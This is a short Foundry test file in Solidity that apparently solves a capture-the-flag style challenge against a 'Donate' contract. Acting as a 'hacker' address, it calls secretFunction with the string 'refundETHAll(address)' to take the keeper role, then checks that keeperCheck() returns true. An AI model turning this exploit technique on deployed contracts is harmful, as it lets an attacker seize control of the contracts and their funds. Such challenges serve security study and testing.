// SPDX-License-Identifier: MIT
// pragma solidity 0.8.7;
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/Donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
        // Hack Time
        donate.secretFunction("refundETHAll(address)");
        // End Hack
        require(donate.keeperCheck() == true, "hacker failed");
    }
}
